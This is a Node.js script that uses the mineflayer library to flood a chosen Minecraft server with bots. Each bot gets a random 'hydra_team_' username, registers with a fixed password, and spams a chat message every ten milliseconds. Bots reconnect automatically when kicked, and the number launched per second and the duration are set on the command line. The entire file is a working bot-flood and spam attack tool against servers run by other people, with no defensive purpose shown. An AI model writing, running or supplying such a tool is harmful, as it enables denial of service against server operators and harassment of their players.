process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
const mineflayer = require('mineflayer');
const { program } = require('commander');

program
  .requiredOption('--ip <type>', 'Server IP address')
  .requiredOption('--bps <type>', 'Bots per second')
  .requiredOption('--time <type>', 'Time in seconds')
  .requiredOption('--protocol <type>', 'Protocol')
  .requiredOption('--chat <type>', 'Message to spam');

program.parse(process.argv);

const options = program.opts();

const spamMessage = options.chat;

const generateRandomUsername = () => {
  const randomNumber = Math.floor(Math.random() * 1000000);
  return `hydra_team_${randomNumber}`;
};

const generateRandomChatMessage = () => {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let randomMessage = '';
  for (let i = 0; i < 4; i++) {
    randomMessage += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  return randomMessage;
};

const createBot = () => {
  const bot = mineflayer.createBot({
    host: options.ip,
    port: 25565,
    version: options.protocol,
    username: generateRandomUsername(),
    skipValidation: true,
  });

  bot.on('login', () => {
    bot.chat('/register aa123456aa');
    setTimeout(() => bot.chat('/register aa123456aa aa123456aa'), 1000);

    setTimeout(() => {
      setInterval(() => {
        bot.chat(spamMessage + " " + generateRandomChatMessage());
      }, 10);
    }, 3000);
  });

  bot.on('end', () => {
    setTimeout(() => {
      createBot();
    }, 1000);
  });

  bot.on('error', (err) => {
    console.log("Error:", err);
    setTimeout(() => {
      createBot();
    }, 1000);
  });
};

const startBots = () => {
  const interval = 1000 / options.bps;
  const totalBots = options.bps * options.time;
  let botsCreated = 0;

  const createBots = () => {
    if (botsCreated < totalBots) {
      createBot();
      botsCreated += 1;
      setTimeout(createBots, interval);
    }
  };

  createBots();
};

startBots();
